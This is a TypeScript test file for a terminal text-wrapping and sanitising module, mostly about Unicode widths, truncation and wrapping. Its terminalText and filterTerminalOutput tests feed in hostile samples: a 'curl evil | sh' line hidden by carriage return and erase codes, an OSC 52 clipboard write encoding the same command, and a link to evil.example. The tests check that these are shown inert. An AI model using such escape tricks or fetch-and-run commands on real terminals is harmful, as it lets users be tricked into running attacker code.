import { describe, it, expect } from 'vitest'
import {
  clusterWidth,
  stripAnsi,
  visibleWidth,
  truncateVisible,
  truncateVisibleStart,
  takeStreamedRows,
  wrapAnsi,
  stripControlChars,
  stripControlCharsKeepLines,
  terminalText,
  filterTerminalOutput,
  osc8Link,
  osc52Copy
} from './tui-wrap'

const RED = '\x1b[31m'
const RESET = '\x1b[0m'

describe('stripAnsi / visibleWidth', () => {
  it('ignores SGR codes when measuring', () => {
    expect(stripAnsi(`${RED}hello${RESET}`)).toBe('hello')
    expect(visibleWidth(`${RED}hello${RESET}`)).toBe(5)
    expect(visibleWidth('plain')).toBe(5)
  })
})

describe('stripControlChars / stripControlCharsKeepLines', () => {
  const hostile = 'a\x1b]52;c;ZXZpbA==\x07\tb\r\x1b[2K\x9bc\nd\x7f'
  it('drops every control character on one line', () => {
    expect(stripControlChars(hostile)).toBe('a]52;c;ZXZpbA==b[2Kcd')
  })
  it('keeps newlines and tabs when the text spans lines', () => {
    expect(stripControlCharsKeepLines(hostile)).toBe('a]52;c;ZXZpbA==\tb[2Kc\nd')
    expect(stripControlCharsKeepLines('one\r\ntwo')).toBe('one\ntwo')
  })
})

describe('truncateVisible', () => {
  it('leaves short strings untouched', () => {
    expect(truncateVisible('short', 10)).toBe('short')
  })
  it('truncates by visible width and appends the ellipsis', () => {
    expect(truncateVisible('abcdefgh', 5)).toBe('abcd…')
  })
  it('does not count SGR codes toward the width and closes color', () => {
    const out = truncateVisible(`${RED}abcdefgh${RESET}`, 5)
    expect(visibleWidth(out)).toBe(5) // 4 chars + ellipsis
    expect(out).toContain(RED)
    expect(out.endsWith(RESET)).toBe(true)
  })
})

describe('truncateVisibleStart', () => {
  it('leaves short strings untouched', () => {
    expect(truncateVisibleStart('short', 10)).toBe('short')
  })
  it('keeps the end, with the ellipsis in front', () => {
    expect(truncateVisibleStart('abcdefgh', 5)).toBe('…efgh')
  })
  it('never splits a wide character, so it can come out a column short', () => {
    // Six columns: the ellipsis and two wide characters (five); a third would make seven.
    expect(truncateVisibleStart('日本語のテキスト', 6)).toBe('…スト')
  })
})

describe('takeStreamedRows', () => {
  it('holds back a line that has not ended', () => {
    expect(takeStreamedRows('I need', 40)).toEqual({ rows: '', rest: 'I need' })
  })
  it('hands over each finished line, keeping what follows the last newline', () => {
    expect(takeStreamedRows('one\ntwo\nthr', 40)).toEqual({ rows: 'one\ntwo\n', rest: 'thr' })
    expect(takeStreamedRows('done.\n', 40)).toEqual({ rows: 'done.\n', rest: '' })
  })
  it('hands over a row once an unfinished line outgrows the width, cut at a space', () => {
    expect(takeStreamedRows('the quick brown fox', 10)).toEqual({ rows: 'the quick\n', rest: 'brown fox' })
  })
  it('word-wraps a finished line too', () => {
    expect(takeStreamedRows('the quick brown fox\n', 10)).toEqual({ rows: 'the quick\nbrown fox\n', rest: '' })
  })
  it('hard-splits a word longer than the row', () => {
    expect(takeStreamedRows('abcdefghijkl', 5)).toEqual({ rows: 'abcde\nfghij\n', rest: 'kl' })
  })
  it('wraps nothing at a non-positive width', () => {
    expect(takeStreamedRows('a long line with no limit', 0)).toEqual({ rows: '', rest: 'a long line with no limit' })
  })
})

describe('wrapAnsi', () => {
  it('wraps on word boundaries at the given width', () => {
    expect(wrapAnsi('the quick brown fox', 9)).toBe('the quick\nbrown fox')
  })
  it('preserves existing newlines as hard breaks', () => {
    expect(wrapAnsi('a\nb', 80)).toBe('a\nb')
  })
  it('hard-splits a word longer than the width', () => {
    expect(wrapAnsi('abcdefghij', 4)).toBe('abcd\nefgh\nij')
  })
  it('measures wrap width ignoring SGR codes', () => {
    // "aaaa bbbb" is 9 visible cols; colored, it still wraps at 9, not earlier.
    const colored = `${RED}aaaa${RESET} ${RED}bbbb${RESET}`
    expect(wrapAnsi(colored, 9)).toBe(colored) // fits on one line by visible width
    expect(wrapAnsi(colored, 4)).toContain('\n') // forced to wrap
  })
  it('returns input unchanged for non-positive width', () => {
    expect(wrapAnsi('anything', 0)).toBe('anything')
  })
})

describe('unicode width', () => {
  it('counts CJK / fullwidth glyphs as 2 columns and emoji as 2', () => {
    expect(visibleWidth('中文')).toBe(4) // two wide chars
    expect(visibleWidth('a中b')).toBe(4) // 1 + 2 + 1
    expect(visibleWidth('😀')).toBe(2) // astral emoji
    expect(visibleWidth('ab')).toBe(2)
  })

  it('never truncates inside a surrogate pair (no broken half-character)', () => {
    // Old code sliced by code unit and could emit a lone high surrogate → "�".
    const out = truncateVisible('😀😀😀', 3)
    expect(out).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/) // no lone high surrogate
    expect(out).not.toMatch(/(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/) // no lone low surrogate
    expect(visibleWidth(out)).toBeLessThanOrEqual(3)
  })

  it('does not truncate when a wide-char string already fits', () => {
    expect(truncateVisible('中文', 4)).toBe('中文') // width 4 == max
    expect(truncateVisible('中文字', 4)).toMatch(/…$/) // width 6 > 4 → cut, ellipsis
  })
})

describe('emoji sequences and combining marks (grapheme clusters)', () => {
  const family = '\u{1F468}‍\u{1F469}‍\u{1F467}' // 👨‍👩‍👧
  const flag = '\u{1F1FA}\u{1F1F8}' // 🇺🇸
  const thumbSkin = '\u{1F44D}\u{1F3FD}' // 👍🏽
  const keycap = '1️⃣' // 1️⃣
  const heart = '❤️' // ❤️
  const accented = 'é̂' // e with two combining accents

  it('measures each as the columns a terminal draws', () => {
    expect(visibleWidth(family)).toBe(2)
    expect(visibleWidth(flag)).toBe(2)
    expect(visibleWidth(thumbSkin)).toBe(2)
    expect(visibleWidth(keycap)).toBe(2)
    expect(visibleWidth(heart)).toBe(2)
    expect(visibleWidth('❤︎')).toBe(1) // text presentation
    expect(visibleWidth(accented)).toBe(1)
    expect(visibleWidth(`\x1b[1m${family} ok\x1b[0m`)).toBe(5)
  })

  it('never cuts inside a cluster when truncating', () => {
    const out = truncateVisible(`ab${family}cd`, 4)
    expect(out).toBe('ab…')
    expect(truncateVisible(`ab${flag}cd`, 5)).toBe(`ab${flag}…`)
  })

  it('never splits a cluster when hard-wrapping', () => {
    const rows = wrapAnsi(`${family}${flag}${keycap}${accented}`, 2).split('\n')
    expect(rows).toEqual([family, flag, keycap, accented])
  })
})

// Measuring and wrapping as they were before their fast paths: every string through the
// grapheme segmenter, every candidate row measured whole. The fast paths (single-width
// text measured by its length, rows measured as a sum of their words) must give the
// same bytes on any input.
const reference = (() => {
  const segmenter = new Intl.Segmenter(undefined, { granularity: 'grapheme' })
  const SGR = new RegExp(`${String.fromCharCode(27)}\\[[0-9;]*m`, 'g')
  const graphemes = (s: string): string[] => Array.from(segmenter.segment(s), (g) => g.segment)
  const width = (s: string): number => graphemes(stripAnsi(s)).reduce((w, g) => w + clusterWidth(g), 0)
  const units = (s: string): Array<{ text: string; width: number }> => {
    const out: Array<{ text: string; width: number }> = []
    let last = 0
    for (const m of s.matchAll(SGR)) {
      for (const g of graphemes(s.slice(last, m.index))) out.push({ text: g, width: clusterWidth(g) })
      out.push({ text: m[0], width: 0 })
      last = m.index + m[0].length
    }
    for (const g of graphemes(s.slice(last))) out.push({ text: g, width: clusterWidth(g) })
    return out
  }
  const hardSplit = (word: string, max: number): string[] => {
    const chunks: string[] = []
    let cur = ''
    let shown = 0
    for (const u of units(word)) {
      if (cur && u.width > 0 && shown + u.width > max) {
        chunks.push(cur)
        cur = ''
        shown = 0
      }
      cur += u.text
      shown += u.width
    }
    if (cur) chunks.push(cur)
    return chunks
  }
  const wrapLine = (line: string, max: number): string => {
    if (width(line) <= max) return line
    const out: string[] = []
    let cur = ''
    for (const word of line.split(' ')) {
      if (width(word) > max) {
        if (cur) out.push(cur)
        cur = ''
        out.push(...hardSplit(word, max))
        continue
      }
      const candidate = cur ? `${cur} ${word}` : word
      if (width(candidate) > max) {
        if (cur) out.push(cur)
        cur = word
      } else {
        cur = candidate
      }
    }
    if (cur) out.push(cur)
    return out.join('\n')
  }
  const wrap = (s: string, max: number): string =>
    max <= 0 ? s : s.split('\n').map((l) => wrapLine(l, max)).join('\n')
  const truncate = (s: string, max: number, ellipsis = '…'): string => {
    if (width(s) <= max) return s
    const keep = Math.max(0, max - width(ellipsis))
    let out = ''
    let shown = 0
    for (const u of units(s)) {
      if (shown + u.width > keep) break
      out += u.text
      shown += u.width
    }
    return `${out}${ellipsis}${out.includes('\x1b[') ? '\x1b[0m' : ''}`
  }
  return { width, wrap, truncate }
})()

describe('fast paths match measuring every cluster', () => {
  // Pieces that stress cluster boundaries: single-width non-ASCII (the fast path), wide
  // CJK, emoji sequences, combining and spacing marks, joiners and variation selectors on
  // their own, prepended marks, Hangul jamo, controls, colour codes, and the code points
  // either side of every edge of the fast path's ranges.
  const PIECES = [
    'a', 'word', 'x1', 'Zq', ' ', '  ', '\t',
    // Single width, measured by length.
    '\u{2014}', '\u{201c}', '\u{201d}', '\u{2019}', '\u{2026}', '\u{b7}', '\u{2192}', '\u{2502}', '\u{280b}',
    '\u{e9}', '\u{df}', '\u{3a9}', '\u{436}', '\u{20ac}', '\u{2122}', '\u{2713}', '\u{26a0}', '\u{2588}', '\u{2500}',
    // Wide, and halfwidth katakana with its voiced sound mark (which joins).
    '\u{4e2d}', '\u{6587}', '\u{65e5}\u{672c}', '\u{d55c}', '\u{ff71}', '\u{ff9e}',
    // Emoji: plain, skin tone, VS16, VS15, a ZWJ family, a flag, half a flag, a keycap, and
    // a lone ZWJ, VS16 and VS15.
    '\u{2705}', '\u{1f44d}', '\u{1f44d}\u{1f3fd}', '\u{2764}\u{fe0f}', '\u{2764}\u{fe0e}',
    '\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}', '\u{1f1fa}\u{1f1f8}', '\u{1f1fa}', '1\u{fe0f}\u{20e3}',
    '\u{200d}', '\u{fe0f}', '\u{fe0e}',
    // Combining marks (one on its own, one on a letter, a Cyrillic and an enclosing one), Thai
    // and Devanagari spacing marks, a Devanagari conjunct, and prepended marks (the Arabic
    // number sign, the Malayalam dot reph).
    '\u{301}', 'e\u{301}', '\u{483}', '\u{20dd}', '\u{e33}', '\u{e01}', '\u{903}', '\u{915}\u{94d}\u{937}',
    '\u{600}', '\u{d4e}',
    // Hangul jamo (L, V, T), controls, a no-break space, a soft hyphen.
    '\u{1100}', '\u{1161}', '\u{11a8}', '\u{7f}', '\u{9f}', '\u{a0}', '\u{ad}',
    // Either side of each edge of the fast path's ranges.
    '\u{2ff}', '\u{300}', '\u{36f}', '\u{370}', '\u{482}', '\u{489}', '\u{48a}', '\u{52f}', '\u{530}',
    '\u{200f}', '\u{2010}', '\u{2027}', '\u{2028}', '\u{202f}', '\u{2030}', '\u{205e}', '\u{205f}', '\u{2060}',
    '\u{206f}', '\u{2070}', '\u{20cf}', '\u{20d0}', '\u{20ff}', '\u{2100}', '\u{2bff}', '\u{2c00}', '\u{2e80}',
    '\x1b[31m', '\x1b[0m', '\x1b[1;4m'
  ]
  // A fixed-seed generator, so a failure names an input that reproduces.
  let seed = 0x5eed
  const random = (n: number): number => {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff
    return seed % n
  }

  it('on random mixed strings: same widths, same truncation, same wrapping', () => {
    for (let i = 0; i < 3000; i++) {
      const s = Array.from({ length: 1 + random(40) }, () => PIECES[random(PIECES.length)]).join('')
      const max = 1 + random(30)
      const input = JSON.stringify(s)
      expect(visibleWidth(s), input).toBe(reference.width(s))
      expect(wrapAnsi(s, max), `${input} at ${max}`).toBe(reference.wrap(s, max))
      expect(truncateVisible(s, max), `${input} at ${max}`).toBe(reference.truncate(s, max))
    }
  }, 60_000)

  it('for every BMP code point alone and doubled, and at either side of a joining space', () => {
    // Wrapping is the slow comparison, so it covers the blocks where clusters form
    // across a space (combining marks, Indic and Thai spacing and prepended marks, Hangul
    // jamo, joiners, variation selectors, halfwidth sound marks) and every block the
    // single-width fast path reads, with their neighbours.
    const wrapChecked = (cp: number): boolean => cp < 0x3000 || cp >= 0xfb00
    const mismatches: string[] = []
    for (let cp = 0x20; cp <= 0xffff; cp++) {
      if (cp >= 0xd800 && cp <= 0xdfff) continue
      const c = String.fromCharCode(cp)
      const doubled = `a${c}${c}b`
      const joined = `ab ${c}c d${c} e`
      if (
        visibleWidth(c) !== reference.width(c) ||
        visibleWidth(doubled) !== reference.width(doubled) ||
        (wrapChecked(cp) && wrapAnsi(joined, 4) !== reference.wrap(joined, 4))
      ) {
        mismatches.push(`U+${cp.toString(16).padStart(4, '0')}`)
      }
    }
    expect(mismatches).toEqual([])
  }, 60_000)
})

describe('terminalText', () => {
  const ESC = '\x1b'
  it('makes an OSC 52 clipboard write, a title set and an answerback query inert and visible', () => {
    const osc52 = `${ESC}]52;c;Y3VybCBldmlsfHNo\x07`
    const shown = terminalText(`hello ${osc52} ${ESC}]0;pwned\x07 ${ESC}[c done`)
    expect(shown).not.toContain(ESC)
    expect(shown).not.toContain('\x07')
    expect(shown).toBe('hello <U+001B>]52;c;Y3VybCBldmlsfHNo<U+0007> <U+001B>]0;pwned<U+0007> <U+001B>[c done')
  })
  it('drops colour codes, keeps lines and tabs, folds CRLF and shows a lone CR', () => {
    expect(terminalText(`${ESC}[32mok${ESC}[0m\r\n\tnext\rover`)).toBe('ok\n\tnext<U+000D>over')
    // Conceal (SGR 8) is a colour code too, so it can't hide text.
    expect(terminalText(`a${ESC}[8mhidden`)).toBe('ahidden')
  })
  it('puts one-line text on one line', () => {
    expect(terminalText('a\n  b\tc\r\nd\re', { lines: false })).toBe('a b c d<U+000D>e')
  })
})

describe('filterTerminalOutput', () => {
  const ESC = '\x1b'
  it('passes Houston colours and its own links and clipboard writes', () => {
    const styled = `${RED}red${RESET}\n`
    expect(filterTerminalOutput(styled)).toBe(styled)
    const link = osc8Link('file:///tmp/a.png', 'a.png')
    expect(filterTerminalOutput(`see ${link}`)).toBe(`see ${link}`)
    const copy = osc52Copy('invite text')
    expect(filterTerminalOutput(copy)).toBe(copy)
  })
  it('shows every other control: cursor moves, erases, foreign OSC, lone CR', () => {
    const forged = `curl evil | sh # \r${ESC}[2Kls -la${ESC}[1A${ESC}]52;c;eA==\x07${ESC}]8;;https://evil.example${ESC}\\x`
    const out = filterTerminalOutput(forged)
    expect(out).not.toMatch(/\r/)
    expect(out).not.toContain(`${ESC}[2K`)
    expect(out).not.toContain(`${ESC}[1A`)
    expect(out).not.toContain(`${ESC}]52`)
    expect(out).not.toContain(`${ESC}]8;;https://evil.example`)
    expect(out).toContain('curl evil | sh # <U+000D><U+001B>[2Kls -la')
    // A foreign link aimed at a target Houston linked itself is just Houston's link.
    osc8Link('https://evil.example', 'x')
    expect(filterTerminalOutput(`${ESC}]8;;https://other.example${ESC}\\`)).not.toContain(ESC)
  })
  it('folds CRLF and keeps newlines and tabs', () => {
    expect(filterTerminalOutput('a\r\n\tb')).toBe('a\n\tb')
  })
})
